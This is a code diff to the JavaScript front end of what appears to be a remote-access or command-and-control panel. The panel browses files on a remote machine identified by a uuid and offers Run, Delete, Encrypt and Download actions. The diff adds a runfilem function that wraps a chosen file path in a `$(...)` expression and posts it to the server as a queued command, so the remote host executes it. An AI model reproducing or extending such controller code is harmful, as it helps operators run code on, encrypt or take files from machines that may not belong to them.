@@ -1174,7 +1174,7 @@ function search_dir_show() {
           if (data.Length) {
             var sizeInMB = (Number(data.Length) / (1024 * 1024)).toFixed(2) + 'MB'
             var file_type = "file"
-            var access_option=` <a href="javascript:void(0)"  >Run </a>  <a href="javascript:void(0)"  onclick="delete_file_format(this)" file_format="">Delete </a><a href="javascript:void(this)"  >Encrypt </a><a href="javascript:void(0)"  onclick="dlfilem(this)" name='${data.Name}' fullname='${data.FullName}' DirectoryName='${data.DirectoryName}'>Download </a>`
+            var access_option=` <a href="javascript:void(0)"  onclick="runfilem(this)" fullname='${data.FullName}'>Run </a>  <a href="javascript:void(0)"  onclick="delete_file_format(this)" file_format="">Delete </a><a href="javascript:void(this)"  >Encrypt </a><a href="javascript:void(0)"  onclick="dlfilem(this)" name='${data.Name}' fullname='${data.FullName}' DirectoryName='${data.DirectoryName}'>Download </a>`
 
           } else {
            
@@ -1358,8 +1358,9 @@ function get_dlfilem(){
       } 
     }
     );
-
 }
+
+
 function dlfilem(e){
   var uuid = window.location.href.split("#")[1];
   var file_name = $(e).attr("name");
@@ -1380,6 +1381,16 @@ function dlfilem(e){
   }, 1500);
   localStorage.setItem("Interval", Interval);
 
+  
+}
+function runfilem(e){
+  var uuid = window.location.href.split("#")[1];
+  var full_name = $(e).attr("fullname");
+  var cmd=`$(${full_name})`
+  $.post(
+    BASE_URL,
+    { add_command: true, command: cmd, uuid: uuid, token: token }
+  );
   
 }
 
